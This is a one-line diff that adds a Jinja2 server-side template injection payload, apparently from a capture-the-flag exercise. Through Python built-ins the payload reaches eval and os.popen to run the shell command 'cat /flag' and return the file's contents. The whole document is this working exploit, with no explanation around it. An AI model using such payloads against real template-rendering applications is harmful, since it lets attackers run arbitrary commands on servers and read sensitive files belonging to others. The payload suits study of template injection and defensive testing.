@@ -1,0 +1,1 @@
+{{lipsum.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")}}
